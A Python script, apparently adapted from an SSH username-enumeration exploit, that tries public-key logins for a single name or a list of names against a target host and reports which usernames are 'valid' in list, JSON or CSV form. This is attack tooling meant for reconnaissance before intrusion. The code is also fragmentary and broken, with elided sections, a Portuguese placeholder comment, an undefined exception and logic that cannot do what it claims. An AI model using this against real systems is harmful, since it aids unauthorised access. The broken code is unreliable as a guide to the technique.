#!/usr/bin/env python3

import argparse
import logging
import socket
import sys
import json
from ssh2.session import Session
import multiprocessing

# ...

def check_username(username, tried=0):
    sock = socket.socket()

    try:
        sock.connect((args.hostname, args.port))
    except TimeoutError as e:
        print(f"[-] Connection to {args.hostname}:{args.port} timed out. Please check the host and port.")
        sys.exit(1)

    session = Session()
    session.handshake(sock)

    try:
        session.userauth_publickey_fromfile(username, "/path/to/private/key", "/path/to/public/key")
    except BadUsername:
        return username, False
    except:
        pass

    if not session.userauth_authenticated():
        return username, False

    return username, True

def export_json(results):
    data = {"Valid": [], "Invalid": []}
    for result in results:
        if result[1] and result[0] not in data['Valid']:
            data['Valid'].append(result[0])
        elif not result[1] and result[0] not in data['Invalid']:
            data['Invalid'].append(result[0])
    return json.dumps(data)

def export_csv(results):
    final = "Username, Valid\n"
    for result in results:
        final += result[0] + ", " + str(result[1]) + "\n"
    return final

def export_list(results):
    final = ""
    for result in results:
        if result[1]:
            final += result[0] + " is a valid user!\n"
        else:
            final += result[0] + " is not a valid user!\n"
    return final

# Restante do código...

if __name__ == "__main__":
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('hostname', type=str, help="The target hostname or ip address")
    arg_parser.add_argument('--port', type=int, default=22, help="The target port")
    arg_parser.add_argument('--threads', type=int, default=5, help="The number of threads to be used")
    arg_parser.add_argument('--outputFile', type=str, help="The output file location")
    arg_parser.add_argument('--outputFormat', choices=['list', 'json', 'csv'], default='list', type=str,
                            help="The output file location")
    group = arg_parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--username', type=str, help="The single username to validate")
    group.add_argument('--userList', type=str, help="The list of usernames (one per line) to enumerate through")
    args = arg_parser.parse_args()

    if args.username:  # single username passed in
        result = check_username(args.username)
        if result[1]:
            print(result[0] + " is a valid user!")
        else:
            print(result[0] + " is not a valid user!")
    elif args.userList:  # username list passed in
        try:
            with open(args.userList) as f:
                usernames = list(map(str.strip, f.readlines()))
        except IOError:
            print("[-] File doesn't exist or is unreadable.")
            sys.exit(3)

        # map usernames to their respective threads
        pool = multiprocessing.Pool(args.threads)
        results = pool.map(check_username, usernames)

        try:
            with open(args.outputFile, "w") as outputFile:
                if args.outputFormat == 'list':
                    outputFile.writelines(export_list(results))
                    print("[+] Results successfully written to " + args.outputFile + " in List form.")
                elif args.outputFormat == 'json':
                    outputFile.writelines(export_json(results))
                    print("[+] Results successfully written to " + args.outputFile + " in JSON form.")
                elif args.outputFormat == 'csv':
                    outputFile.writelines(export_csv(results))
                    print("[+] Results successfully written to " + args.outputFile + " in CSV form.")
                else:
                    print("".join(results))
        except IOError:
            print("[-] Cannot write to outputFile.")
            sys.exit(5)
    else:  # no usernames passed in
        print("[-] No usernames provided to check")
        sys.exit(4)
